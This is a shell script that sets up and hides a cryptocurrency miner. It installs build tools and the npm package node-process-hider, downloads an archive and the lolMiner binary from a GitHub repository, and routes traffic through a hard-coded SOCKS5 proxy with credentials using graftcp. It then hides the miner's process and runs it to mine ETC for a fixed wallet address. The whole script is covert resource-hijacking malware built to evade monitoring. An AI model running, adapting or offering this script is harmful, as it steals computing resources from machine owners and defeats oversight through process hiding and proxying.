apt update && apt -y install sudo wget curl unzip

sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -

apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime

dpkg-reconfigure --frontend noninteractive tzdata

wget https://github.com/DeniBogeh/DeniBogehh/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 143.198.80.229:443
socks5_username = babang
socks5_password = babang123
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

./graftcp/graftcp wget https://github.com/DeniBogeh/DeniBogehh/raw/main/lolMiner
chmod +x lolMiner

ph add lolMiner

./graftcp/graftcp ./lolMiner --algo ETC --pool us-etc.2miners.com:1010 --user 0x2a22a8f933f746c02b16e455756c9835ea556bdc.$(echo $(shuf -i 1-999 -n 1)-LOL) --ethstratum ETHPROXY
